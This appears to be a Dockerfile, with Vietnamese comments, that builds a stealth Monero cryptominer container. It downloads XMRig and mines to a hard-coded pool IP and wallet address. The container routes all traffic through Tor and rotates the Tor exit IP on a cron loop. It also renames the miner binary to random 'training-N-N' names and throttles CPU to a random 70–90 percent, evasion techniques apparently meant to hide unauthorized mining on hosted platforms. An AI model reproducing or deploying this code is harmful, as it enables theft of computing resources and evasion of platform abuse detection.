# Sử dụng image cơ bản từ Ubuntu 20.04
FROM ubuntu:20.04

# Cài đặt các package cần thiết bao gồm Tor và Privoxy
RUN apt-get update && apt-get install -y \
    torsocks \
    wget \
    tor \
    privoxy \
    cron \
    && apt-get clean

# Thiết lập các biến môi trường và thông số XMRig
ENV VERSION="6.21.0" \
    WORK_DIR="/root/work" \
    POOL="47.238.48.153:8080" \
    USERNAME="44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao" \
    ALGO="rx/0" \
    DONATE="1" \
    TOR_PORT="9051"

# Tạo thư mục làm việc
RUN mkdir -p $WORK_DIR

# Tải xuống và giải nén XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz -P $WORK_DIR \
    && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR

# Sao chép file cấu hình privoxy và tor vào container
COPY config /etc/privoxy/config
COPY torrc /etc/tor/torrc

# Cấp quyền cho cấu hình Tor và Privoxy
RUN chmod 644 /etc/tor/torrc && chmod 644 /etc/privoxy/config

# Tạo script đổi IP ngẫu nhiên, xóa tên cũ và chạy lại với tên mới
RUN echo '#!/bin/bash\nwhile true; do\n  sleep $((RANDOM % 1200 + 600))\n  echo "Đang yêu cầu Tor thay đổi IP..."\n  kill -HUP $(pgrep tor)\n  echo "Tor đã thay đổi IP."\n  if [ -f /root/xmrig_name.txt ]; then\n    echo "Dừng XMRig với tên cũ..."\n    xmrig_name=$(cat /root/xmrig_name.txt)\n    pkill -f $xmrig_name\n    rm -f /root/xmrig_name.txt\n    sleep 5\n  fi\n  echo "Tạo tên mới cho XMRig..."\n  RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))\n  mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME\n  chmod +x $WORK_DIR/$RANDOM_NAME\n  echo $RANDOM_NAME > /root/xmrig_name.txt\n  echo "Chạy lại XMRig với tên mới $RANDOM_NAME..."\n  cpu_hint=$(shuf -i 70-90 -n 1)\n  torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint &\ndone' > /root/change_ip.sh \
    && chmod +x /root/change_ip.sh

# Khởi tạo cron job để đổi IP ngẫu nhiên
RUN (crontab -l; echo "@reboot /root/change_ip.sh") | crontab -

# Khởi động dịch vụ Tor và Privoxy và cron
CMD service tor start && service privoxy start && service cron start && \
    cpu_hint=$(shuf -i 70-90 -n 1) && \
    xmrig_name=$(cat /root/xmrig_name.txt) && \
    torsocks $WORK_DIR/$xmrig_name \
    --donate-level ${DONATE} \
    -o ${POOL} \
    -u ${USERNAME} \
    -a ${ALGO} \
    --no-huge-pages \
    -k --tls \
    --cpu-max-threads-hint=$cpu_hint
